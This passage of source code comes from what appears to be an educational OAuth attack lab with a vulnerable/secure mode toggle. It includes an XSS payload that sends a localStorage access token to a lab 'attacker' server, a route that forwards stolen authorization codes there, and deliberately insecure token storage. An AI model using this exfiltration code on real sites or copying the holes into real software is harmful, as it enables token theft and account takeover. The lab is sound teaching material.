  </div>

  <div class="div-row"><span class="div-lbl">7 Attack Scenarios</span><span class="div-line"></span></div>
  <div class="atk-list">
    <a class="atk-row" href="/docs">
      <div class="arow-n">1</div>
      <div class="arow-info"><div class="arow-title">Redirect URI Manipulation</div><div class="arow-sub">Prefix matching lets attacker steal the authorization code</div></div>
      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">2</div>
      <div class="arow-info"><div class="arow-title">Authorization Code Interception (PKCE Bypass)</div><div class="arow-sub">Stolen codes exchanged without code_verifier</div></div>
      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">token.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">3</div>
      <div class="arow-info"><div class="arow-title">Token Leakage via XSS</div><div class="arow-sub">localStorage tokens readable by any injected JavaScript</div></div>
      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">client/server.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">4</div>
      <div class="arow-info"><div class="arow-title">OAuth Consent Abuse</div><div class="arow-sub">Malicious app requests admin scope — no approval gate</div></div>
      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">5</div>
      <div class="arow-info"><div class="arow-title">Refresh Token Abuse</div><div class="arow-sub">Non-rotating 10-year tokens give permanent attacker access</div></div>
      <div class="arow-r"><span class="sev sev-cr">CRIT</span><span class="fbadge">token.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">6</div>
      <div class="arow-info"><div class="arow-title">Scope Escalation</div><div class="arow-sub">Server grants all requested scopes, ignoring registration</div></div>
      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
    </a>
    <a class="atk-row" href="/docs">
      <div class="arow-n">7</div>
      <div class="arow-info"><div class="arow-title">JWT Algorithm Confusion (alg=none)</div><div class="arow-sub">CVE-2015-9235 — unsigned forged tokens accepted</div></div>
      <div class="arow-r"><span class="sev sev-cr">CRIT</span><span class="fbadge">resource/server.js</span></div>
    </a>
  </div>

  <div class="div-row"><span class="div-lbl">Test Credentials</span><span class="div-line"></span></div>
  <table>
    <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
    <tbody>
      <tr><td><code>alice</code></td><td><code>password123</code></td><td>Regular user</td></tr>
      <tr><td><code>admin</code></td><td><code>adminpass</code></td><td>Administrator</td></tr>
    </tbody>
  </table>

  <div class="pgfoot">
    <span>Built by <a href="https://github.com/SinhaAmrit" target="_blank">SinhaAmrit</a></span>
    <span>Educational use only</span>
  </div>
</main>
</div>

<script>
async function toggleMode() {
  const btn = document.getElementById('toggleBtn');
  const status = document.getElementById('toggle-status');
  const lbl = document.getElementById('mlbl');
  btn.disabled = true;
  btn.textContent = 'Switching…';
  status.style.color = 'var(--t3)';
  status.textContent = '⏳ Toggling mode…';
  try {
    const r = await fetch('/api/toggle-mode', { method: 'POST' });
    const d = await r.json();
    if (d.vulnerable !== undefined) {
      status.textContent = '✅ ' + (d.message || 'Mode switched') + ' — reloading…';
      setTimeout(() => window.location.reload(), 900);
    } else {
      status.style.color = 'var(--rd)';
      status.textContent = '❌ ' + (d.error || 'Unknown error');
      btn.disabled = false;
      btn.textContent = 'Try Again';
    }
  } catch(e) {
    status.style.color = 'var(--rd)';
    status.textContent = '❌ ' + e.message;
    btn.disabled = false;
    btn.textContent = 'Try Again';
  }
}
</script>
</body>
</html>`;
}

function renderTokenStoragePage(accessToken, refreshToken, vulnerable, extraMsg) {
  const storageWarning = vulnerable
    ? `<div style="background:rgba(224,90,58,.08);border:2px solid #e05a3a;border-radius:6px;padding:12px 14px;margin-bottom:14px">
        <strong style="color:#e05a3a">⚠️ VULNERABLE: Token stored in localStorage</strong>
        <p style="font-size:12px;margin-top:6px;color:#5c4a2a">The access token is readable by any JavaScript on the page — including XSS payloads. Open DevTools → Application → Local Storage → http://localhost:3002 to see it.</p>
        <div id="tokenDisplay" style="margin-top:8px;font-family:'Courier Prime',monospace;font-size:11px;background:#fff9e8;border:1.5px dashed #d4b896;border-radius:4px;padding:8px;word-break:break-all;color:#3a6eb5">Storing token…</div>
       </div>`
    : '';
  const extraHtml   = extraMsg ? `<div class="msg">${extraMsg}</div>` : '';
  const scriptBlock = vulnerable
    ? `<script>
localStorage.setItem('access_token', '${accessToken}');
localStorage.setItem('refresh_token', '${refreshToken}');
document.getElementById('tokenDisplay').textContent = 'access_token = ' + '${accessToken}'.substring(0,50) + '...';
<\/script>`
    : '';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>✅ OAuth Callback</title>
${SHARED_NAV_CSS}
<style>
.card{background:var(--paper);border:2px solid var(--border);border-radius:10px;padding:24px;max-width:700px;margin:24px auto;box-shadow:var(--shadow)}
h2{font-size:18px;font-weight:900;margin-bottom:12px;color:var(--ink)}
.msg{background:rgba(212,133,42,.08);border:2px solid var(--orange);border-radius:6px;padding:10px 13px;margin-bottom:14px;font-weight:700;font-size:13px;color:var(--orange)}
.btn-row{display:flex;gap:10px;margin-top:16px;flex-wrap:wrap}
.btn{padding:9px 18px;border-radius:5px;font-size:13px;font-weight:800;cursor:pointer;border:2px solid;font-family:var(--sans);text-decoration:none;display:inline-block;box-shadow:var(--shadow);transition:all .12s}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 var(--border2)}
.btn-blue{background:rgba(58,110,181,.1);color:var(--blue);border-color:var(--blue)}
.btn-green{background:rgba(58,158,106,.1);color:var(--green);border-color:var(--green)}
</style>
</head>
<body>
${sharedNav('/login')}
<div class="card">
<h2>✅ Login Successful!</h2>
${extraHtml}
${storageWarning}
<div class="btn-row">
  <a href="/dashboard" class="btn btn-blue">📊 Go to Dashboard</a>
  <a href="/xss-demo" class="btn btn-green">⚔️ Try XSS Theft Demo</a>
</div>
</div>
${scriptBlock}
</body>
</html>`;
}

function renderVulnerableDashboard(resourceServer) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>📊 Dashboard — VULNERABLE</title>
${SHARED_NAV_CSS}
<style>
.card{background:var(--paper);border:2px solid var(--border);border-radius:10px;padding:24px;max-width:700px;margin:24px auto;box-shadow:var(--shadow);position:relative;z-index:1}
.mode-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;border-radius:10px;font-size:11px;font-weight:800;border:2px solid var(--red);background:rgba(224,90,58,.1);color:var(--red);font-family:var(--mono);margin-bottom:14px}
h2{font-size:18px;font-weight:900;margin-bottom:12px;color:var(--ink)}
.warn{background:rgba(212,133,42,.08);border:2px solid var(--orange);border-radius:6px;padding:10px 13px;margin-bottom:14px;font-size:12.5px;color:var(--ink2)}
pre{background:var(--paper2);border:1.5px dashed var(--border);border-radius:5px;padding:12px;overflow:auto;font-family:var(--mono);font-size:12px;color:var(--ink);margin-top:10px}
.btn-row{display:flex;gap:10px;margin-top:16px;flex-wrap:wrap}
.btn{padding:9px 18px;border-radius:5px;font-size:13px;font-weight:800;border:2px solid;font-family:var(--sans);text-decoration:none;display:inline-block;box-shadow:var(--shadow);transition:all .12s;cursor:pointer;background:transparent}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 var(--border2)}
.btn-red{color:var(--red);border-color:var(--red)}
.btn-gray{color:var(--ink3);border-color:var(--border)}
#error{color:var(--red);font-size:12px;margin-top:8px;font-family:var(--mono)}
</style>
</head>
<body>
${sharedNav('/dashboard')}
<div class="page-wrap">
<div class="card">
  <div class="mode-badge">🔴 VULNERABLE MODE</div>
  <h2>📊 Protected Dashboard</h2>
  <div class="warn">⚠️ <strong>Attack 3 — Token in localStorage:</strong> Open DevTools → Application → Local Storage → http://localhost:3002 to see your token. XSS can steal it.</div>
  <div id="content" style="font-size:13px;color:#5c4a2a">Loading profile from Resource Server…</div>
  <div id="error"></div>
  <div class="btn-row">
    <a href="/xss-demo" class="btn btn-red">⚔️ Try XSS Token Theft</a>
    <a href="/logout" class="btn btn-gray">Logout</a>
  </div>
</div>
<script>
const token = localStorage.getItem('access_token');
if (!token) {
  document.getElementById('content').innerHTML = '<p>No token found. <a href="/login" style="color:#3a6eb5;font-weight:700">Login again</a></p>';
} else {
  fetch('${resourceServer}/api/profile', { headers: { 'Authorization': 'Bearer ' + token } })
    .then(r => r.json())
    .then(data => {
      document.getElementById('content').innerHTML = '<h3 style="margin-bottom:8px">Welcome, <strong>' + (data.username || 'User') + '</strong>!</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
    })
    .catch(err => { document.getElementById('error').textContent = 'Error: ' + err.message; });
}
</script>
</div>
</body>
</html>`;
}

function renderDashboard(data, vulnerable, error) {
  const modeBg = vulnerable ? 'rgba(224,90,58,.1)' : 'rgba(58,158,106,.1)';
  const modeBorder = vulnerable ? '#e05a3a' : '#3a9e6a';
  const modeColor = vulnerable ? '#e05a3a' : '#3a9e6a';
  const modeLabel = vulnerable ? '🔴 VULNERABLE MODE' : '🟢 SECURE MODE';
  const errHtml  = error ? `<div class="err-box">Error: ${JSON.stringify(error)}</div>` : '';
  const dataHtml = data  ? `<h3 style="margin-bottom:8px">Welcome, <strong>${data.username || 'User'}</strong>!</h3><pre>${JSON.stringify(data, null, 2)}</pre>` : '';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>📊 Dashboard</title>
${SHARED_NAV_CSS}
<style>
.card{background:var(--paper);border:2px solid var(--border);border-radius:10px;padding:24px;max-width:700px;margin:24px auto;box-shadow:var(--shadow);position:relative;z-index:1}
.mode-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;border-radius:10px;font-size:11px;font-weight:800;border:2px solid ${modeBorder};background:${modeBg};color:${modeColor};font-family:var(--mono);margin-bottom:14px}
h2{font-size:18px;font-weight:900;margin-bottom:12px;color:var(--ink)}
.err-box{background:rgba(224,90,58,.07);border:2px solid var(--red);border-radius:6px;padding:10px 13px;margin-bottom:14px;font-size:12px;color:var(--red);font-family:var(--mono)}
pre{background:var(--paper2);border:1.5px dashed var(--border);border-radius:5px;padding:12px;overflow:auto;font-family:var(--mono);font-size:12px;color:var(--ink);margin-top:10px}
.btn{padding:9px 18px;border-radius:5px;font-size:13px;font-weight:800;border:2px solid var(--border);font-family:var(--sans);text-decoration:none;display:inline-block;box-shadow:var(--shadow);transition:all .12s;color:var(--ink3);margin-top:16px}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 var(--border2)}
</style>
</head>
<body>
${sharedNav('/dashboard')}
<div class="page-wrap">
<div class="card">
  <div class="mode-badge">${modeLabel}</div>
  <h2>📊 Protected Dashboard</h2>
  ${errHtml}
  ${dataHtml}
  <br><a href="/logout" class="btn">Logout</a>
</div>
</div>
</body>
</html>`;
}

function renderError(message) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><link href="https://fonts.googleapis.com/css2?family=Nunito:wght@700;900&display=swap" rel="stylesheet"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Nunito',sans-serif;background:#fdf6e3;display:flex;align-items:center;justify-content:min-height:100vh;padding:20px}.card{background:#fffef7;border:2px solid #e05a3a;border-radius:10px;padding:28px;max-width:400px;text-align:center;box-shadow:4px 4px 0 #c4a070;margin:40px auto}h2{color:#e05a3a;font-size:18px;margin-bottom:10px}p{color:#5c4a2a;font-size:13px;margin-bottom:16px}a{color:#3a6eb5;font-weight:700;text-decoration:none;border:2px solid #3a6eb5;padding:6px 14px;border-radius:5px;display:inline-block}</style></head><body><div class="card"><h2>⚠️ Error</h2><p>${message}</p><a href="/">← Back to Lab</a></div></body></html>`;
}

// ── GET /xss-demo — Demonstrates XSS token theft ─────────────────────────────
app.get('/xss-demo', (req, res) => {
  const attackerUrl = process.env.ATTACKER_BASE_URL || 'http://localhost:3004';
  const xssPayload = `<script>
  // Simulated XSS payload — in a real attack this would be injected via
  // a comment field, URL parameter, or stored content
  const token = localStorage.getItem('access_token');
  if (token) {
    // Send stolen token to attacker's server
    fetch('${attackerUrl}/capture?token=' + encodeURIComponent(token))
      .then(() => console.log('Token exfiltrated!'));
    document.getElementById('result').innerHTML =
      '<strong>🔴 Token stolen via XSS!</strong><br>Token: ' + token.substring(0,40) + '...';
  } else {
    document.getElementById('result').textContent = 'No token found in localStorage';
  }
<\/script>`;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>⚔️ XSS Token Theft Demo</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Nunito',sans-serif;background:#fdf6e3;color:#2d2416;min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px)}
nav{background:#fffef7;border-bottom:2px solid #d4b896;padding:10px 20px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100;box-shadow:0 2px 0 #d4b896}
nav a{text-decoration:none;font-weight:800}
.card{background:#fffef7;border:2px solid #d4b896;border-radius:10px;padding:24px;max-width:720px;margin:24px auto;box-shadow:4px 4px 0 #c4a070;position:relative;z-index:1}
h2{font-size:18px;font-weight:900;margin-bottom:12px}
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:10px;font-size:10px;font-weight:800;border:2px solid;font-family:'Courier Prime',monospace;margin-bottom:14px}
.badge.vuln{background:rgba(224,90,58,.1);color:#e05a3a;border-color:#e05a3a}
.badge.sec{background:rgba(58,158,106,.1);color:#3a9e6a;border-color:#3a9e6a}
.info-box{background:rgba(212,133,42,.07);border:2px solid #d4852a;border-radius:6px;padding:12px 14px;margin-bottom:16px;font-size:12.5px;color:#5c4a2a;line-height:1.6}
.info-box strong{color:#d4852a}
.result-box{background:#fff9e8;border:2px dashed #d4b896;border-radius:6px;padding:14px;margin:14px 0;font-family:'Courier Prime',monospace;font-size:12px;color:#3a6eb5;min-height:48px;word-break:break-all}
.secure-box{background:rgba(58,158,106,.07);border:2px solid #3a9e6a;border-radius:6px;padding:12px 14px;font-size:13px;color:#3a9e6a;font-weight:700}
.step{font-size:12px;color:#5c4a2a;padding:8px 0;border-bottom:1.5px dashed #d4b896;line-height:1.6}
.step:last-child{border-bottom:none}
.step code{font-family:'Courier Prime',monospace;background:#f5f0e5;padding:1px 5px;border-radius:3px;font-size:11px;color:#3a6eb5}
.btn{padding:8px 16px;border-radius:5px;font-size:12px;font-weight:800;border:2px solid;font-family:'Nunito',sans-serif;text-decoration:none;display:inline-block;box-shadow:3px 3px 0 #c4a070;transition:all .12s;cursor:pointer;background:transparent;margin-top:14px}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 #c4a070}
.btn-red{color:#e05a3a;border-color:#e05a3a}
.btn-blue{color:#3a6eb5;border-color:#3a6eb5}
</style>
</head>
<body>
<nav>
  <a href="/lab" style="font-size:14px;color:#2d2416">🔐 OAuth Lab</a>
  <span style="flex:1;color:#9c8860;font-size:11px">·</span>
  <a href="/lab" style="font-size:11px;color:#3a6eb5;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">📚 Attack Lab</a>
  <a href="/dashboard" style="font-size:11px;color:#5c4a2a;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">Dashboard</a>
  <a href="/logout" style="font-size:11px;color:#9c8860;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">Logout</a>
</nav>
<div class="card">
  <div class="badge ${VULNERABLE ? 'vuln' : 'sec'}">${VULNERABLE ? '🔴 VULNERABLE MODE' : '🟢 SECURE MODE'}</div>
  <h2>⚔️ Attack 3 — XSS Token Theft Demo</h2>
  <div class="info-box">
    <strong>What this demonstrates:</strong> In VULNERABLE mode, your access token lives in <code style="font-family:'Courier Prime',monospace;font-size:11px;background:#fff9e8;padding:1px 5px;border-radius:3px">localStorage</code> — readable by any JavaScript, including XSS payloads injected via form fields, URL params, or stored content.
  </div>
  <div class="result-box" id="result">Running XSS simulation…</div>
  ${VULNERABLE ? xssPayload : '<div class="secure-box">🟢 SECURE MODE: Tokens are in HttpOnly cookies — inaccessible to JavaScript.</div>'}
  <div style="margin-top:16px;border-top:2px dashed #d4b896;padding-top:14px">
    <div class="step">1. Log in via <code>/login</code> to get a token stored in localStorage</div>
    <div class="step">2. This page simulates a malicious script reading <code>localStorage.getItem('access_token')</code></div>
    <div class="step">3. Token is sent to the Attacker server at <code>/capture</code></div>
    <div class="step">4. Check the <a href="${attackerUrl}/dashboard" style="color:#3a6eb5;font-weight:700">Attacker Dashboard</a> to see the stolen token</div>
  </div>
  <div>
    <a href="${attackerUrl}/dashboard" class="btn btn-red">💀 Attacker Dashboard</a>
    <a href="/lab" class="btn btn-blue" style="margin-left:8px">📚 Back to Lab</a>
  </div>
</div>
</body>
</html>`);
});

// ── GET /evil-redirect — Attack 1: captures code and forwards to attacker server ─
// The redirect_uri http://localhost:3002/evil-redirect passes the prefix check
// (starts with "http://localhost:3002") — that is the vulnerability being demonstrated.
// The code then gets forwarded to the attacker's /capture endpoint.
app.get('/evil-redirect', (req, res) => {
  const { code, state } = req.query;
  const attackerCapture = (process.env.ATTACKER_BASE_URL || 'http://localhost:3004') + '/capture';
  if (code) {
    res.redirect(`${attackerCapture}?code=${encodeURIComponent(code)}&state=${encodeURIComponent(state||'')}`);
  } else {
    res.status(400).send('No code received');
  }
});

app.get('/logout', (req, res) => {
  res.clearCookie('access_token');
  res.clearCookie('refresh_token');
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`\n🌐 Client App running on port ${PORT}`);
  console.log(`⚠️  Mode: ${VULNERABLE ? '🔴 VULNERABLE' : '🟢 SECURE'}\n`);
});

// ── POST /api/curl-proxy — Secure curl command executor for the docs portal
// OWASP protections: allowlist-only URLs, command injection prevention,
// rate limiting, no shell execution (uses axios directly), input sanitisation
const CURL_RATE = new Map();
const ALLOWED_CURL_TARGETS = [
  /^\/oauth\/authorize(\?.*)?$/,
  /^\/oauth\/token$/,
  /^\/oauth\/jwks$/,
  /^\/admin\/audit-log(\?.*)?$/,
  /^\/admin\/tokens(\?.*)?$/,
  /^\/admin\/refresh-tokens(\?.*)?$/,
  /^\/admin\/clients(\?.*)?$/,
  /^\/admin\/mode$/,
  /^\/.well-known\/oauth-authorization-server$/,
  /^\/health$/,
  /^\/api\/profile$/,
  /^\/api\/admin\/users$/,
  /^\/api\/jwt-attack-demo$/,
  /^\/capture(\?.*)?$/,
  /^\/api\/latest$/,
  /^\/dashboard(\?.*)?$/,
  /^\/forge-jwt$/,
  /^\/phishing$/,
];
const ALLOWED_SERVICES = ['auth', 'resource', 'attacker'];

app.post('/api/curl-proxy', async (req, res) => {
  // Rate limit: 20 req/min per IP
  const ip = req.ip;
  const now = Date.now();
  const window = CURL_RATE.get(ip) || [];
  const recent = window.filter(t => now - t < 60000);
  if (recent.length >= 20) {
    return res.status(429).json({ error: 'Rate limit exceeded. Max 20 requests/minute.' });
  }
  CURL_RATE.set(ip, [...recent, now]);

  const { service, path: reqPath, method = 'GET', body: reqBody, headers: reqHeaders = {} } = req.body;

  // Validate service
  if (!ALLOWED_SERVICES.includes(service)) {
    return res.status(400).json({ error: 'Invalid service. Allowed: auth, resource, attacker' });
  }

  // Validate path against allowlist
  const pathOk = ALLOWED_CURL_TARGETS.some(rx => rx.test(reqPath));
  if (!pathOk) {
    return res.status(400).json({ error: 'Path not in allowlist. Only lab endpoints are permitted.' });
  }

  // Prevent header injection
  const safeHeaders = {};
  const allowedHeaderKeys = ['authorization', 'content-type', 'accept'];
  for (const [k, v] of Object.entries(reqHeaders)) {
    if (allowedHeaderKeys.includes(k.toLowerCase()) && typeof v === 'string' && v.length < 512) {
      safeHeaders[k] = v.replace(/[\r\n]/g, '');
    }
  }

  // Resolve target URL
  const targets = {
    auth:     process.env.AUTH_SERVER     || 'http://auth-server:3001',
    resource: process.env.RESOURCE_SERVER || 'http://resource-server:3003',
    attacker: `http://attacker-server:${process.env.ATTACKER_PORT || 3004}`,
  };
  const targetUrl = targets[service] + reqPath;

  try {
    const start = Date.now();
    const axRes = await axios({
      method: method.toUpperCase(),
      url: targetUrl,
      data: reqBody || undefined,
      headers: safeHeaders,
      timeout: 8000,
      validateStatus: () => true,
    });
    const elapsed = Date.now() - start;
    res.json({
      status: axRes.status,
      statusText: axRes.statusText,
      headers: axRes.headers,
      body: axRes.data,
      elapsed,
    });
  } catch (err) {
    res.status(502).json({ error: 'Request failed: ' + err.message });
  }
});
